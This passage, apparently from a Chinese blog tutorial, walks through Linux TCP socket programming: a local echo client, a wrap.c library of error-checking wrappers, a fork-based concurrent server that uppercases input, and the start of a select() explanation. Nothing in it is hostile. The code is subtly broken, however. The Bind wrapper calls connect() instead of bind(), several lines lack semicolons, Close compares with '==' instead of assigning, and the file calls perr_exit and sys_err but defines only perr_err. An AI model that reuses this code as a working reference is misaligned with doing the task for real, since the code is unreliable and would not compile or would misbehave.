class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cfd;</span><br><span class="line"><span class="keyword">int</span> conter = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv_addr.sin_addr.s_addr);</span><br><span class="line">cfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">int</span> ret = connect(cfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"connect err"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--conter)&#123;</span><br><span class="line">write(cfd,<span class="string">"hello\n"</span>,<span class="number">6</span>);</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现多进程并发服务器"><a href="#实现多进程并发服务器" class="headerlink" title="实现多进程并发服务器"></a>实现多进程并发服务器</h5><p>首先实现功能封装函数<code>wrap.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = accept(fd,sa,salenptr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((errno == ECONNABORTED) || (errno == EINTR))</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">perr_exit(<span class="string">"accept error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen)</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = socket(domain,type,protocol);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">n = listen(sockfd,backlog);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"listen error"</span>);</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen);</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = read(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = write(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>((n == close(fd)) == <span class="number">-1</span>)</span><br><span class="line">perr_exit(<span class="string">"close error"</span>);</span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> Readn(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nread;</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nread = read(fd,ptr,nleft)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line">nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">nleft-= nread;</span><br><span class="line">ptr += nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n-nleft;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nwritten;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nwritten = write(fd,ptr,nleft)) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(nwritten &lt; <span class="number">0</span> &amp;&amp; errno == EINTR)</span><br><span class="line">nwritten = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">nleft -= nwritten;</span><br><span class="line">ptr += nwritten;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现自定义头文件<code>wrap.h</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Readn</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>实现服务端<code>server.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_child</span><span class="params">(<span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(waitpid(<span class="number">0</span>,<span class="literal">NULL</span>,WNOHANG) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd,cfd;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">lfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(lfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">cfd = Accept(lfd,(struct sockaddr *)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sigaction act;</span><br><span class="line">act.sa_handler = catch_child;</span><br><span class="line">sigemptyset(&amp;act.sa_mask);</span><br><span class="line">act.sa_flags = <span class="number">0</span>;</span><br><span class="line">ret = sigaction(SIGCHLD,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"sigaction error"</span>);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">ret = Read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>联合编译生成<code>server</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc server.c wrap.c -o server</span><br></pre></td></tr></table></figure><h4 id="多路IO转接"><a href="#多路IO转接" class="headerlink" title="多路IO转接"></a>多路IO转接</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>借助内核，select来监听客户端连接、数据通信事件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span></span><br><span class="line"><span class="function"><span class="params">         fd_set *exceptfds, struct timeval *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">nfds:监听的所有文件描述符中，最大文件文件描述符+<span class="number">1</span></span><br><span class="line">readfds:读文件描述符监听集合</span><br><span class="line">writefds:写文件描述符监听集合</span><br><span class="line">exceptfds:异常文件描述符监听集合</span><br><span class="line">timeout:</span><br><span class="line">&gt;<span class="number">0</span> : 设置监听超时时长</span><br><span class="line">  <span class="literal">NULL</span> : 阻塞监听</span><br><span class="line">  <span class="number">0</span> : 非阻塞监听，轮询</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span> <span class="comment">//清空一个文件描述符集合</span></span></span><br><span class="line"><span class="function">  fd_set rset</span>;</span><br><span class="line">FD_ZERO(&amp;rset);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//将待监听的文件描述符，添加到监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_SET</span><span class="params">(<span class="number">3</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">5</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">6</span>,&amp;rset)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span>  <span class="comment">//将一个文件描述符从监听集合中移除</span></span></span><br><span class="line"><span class="function">  <span 